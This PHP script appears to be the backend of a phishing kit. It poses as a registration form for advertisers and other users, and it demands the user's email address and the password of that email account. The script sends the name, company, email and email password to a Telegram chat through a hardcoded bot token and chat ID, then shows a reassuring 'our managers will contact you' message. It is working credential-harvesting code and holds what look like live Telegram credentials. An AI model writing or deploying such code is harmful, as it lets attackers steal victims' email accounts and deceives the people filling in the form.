<?php
// TELEGRAM
// Only process POST requests.
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Replace with your Telegram Bot API token and chat ID.
    $botToken = '6377242619:AAHXehb42p2beh9_Wke2j8PvJYCF1iKy0qI';
    $chatId   = '-1001900073508';

    // Get the form fields and remove whitespace.
    $user_type = strip_tags(trim($_POST["user_type"]));
    $company_name = strip_tags(trim($_POST["company_name"]));
    $company_name = str_replace(array("\r", "\n"), array(" ", " "), $company_name);
    $name         = strip_tags(trim($_POST["name"]));
    $name         = str_replace(array("\r", "\n"), array(" ", " "), $name);
    $email        = trim($_POST["email"]);
    $email_pass   = strip_tags(trim($_POST["email_pass"]));
    $agree        = trim($_POST["agree"]);

    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        http_response_code(200);
        echo "Email is not correct";
        exit();
    }
    if (strlen($email_pass) <= 6) {
        http_response_code(200);
        echo "Password less than 6 characters";
        exit();
    }
    if ($agree == true) {
        if ($user_type == 'advertiser') {
            if (($company_name == '') or ($email_pass == '') or ($email == '')) {
                http_response_code(200);
                echo "Not all fields are filled in";
                exit();
            }
            $telegramMessage  = "Type: $user_type\n";
            $telegramMessage .= "Name: $name\n";
            $telegramMessage .= "Email: $email\n";
            $telegramMessage .= "Email password: $email_pass\n";
        } else {
            if (($company_name == '') or ($email_pass == '') or ($email == '') or ($name == '')) {
                http_response_code(200);
                echo "Not all fields are filled in";
                exit();
            }
            $telegramMessage  = "Type: $user_type\n";
            $telegramMessage .= "Name: $name\n";
            $telegramMessage .= "Name company: $company_name\n";
            $telegramMessage .= "Email: $email\n";
            $telegramMessage .= "Email password: $email_pass\n";
        }

        // Create the URL for sending the message to the Telegram bot.
        $telegramApiUrl     = "https://api.telegram.org/bot{$botToken}/sendMessage";
        $telegramParameters = [
            'chat_id' => $chatId,
            'text'    => $telegramMessage,
        ];

        // Send the message to the Telegram bot using cURL.
        $ch = curl_init($telegramApiUrl);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $telegramParameters);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $telegramResponse = curl_exec($ch);
        curl_close($ch);

        // Check if the message was sent successfully to the Telegram bot.
        if ($telegramResponse && json_decode($telegramResponse)->ok) {
            // Set a 200 (okay) response code.
            http_response_code(200);
            echo "Thank you! Your message has been sent successfully. Our managers will contact you.";
            exit();
        } else {

            // Set a 500 (internal server error) response code.
            http_response_code(500);
            echo "Oops! Something went wrong, and we couldn't send your message to the Telegram bot.";
            exit();
        }
    } else {
        http_response_code(200);
        echo "You must agree to the terms";
        exit();
    }

} else {
    // Not a POST request, set a 403 (forbidden) response code.
    http_response_code(403);
    echo "There was a problem with your submission, please try again.";
}
?>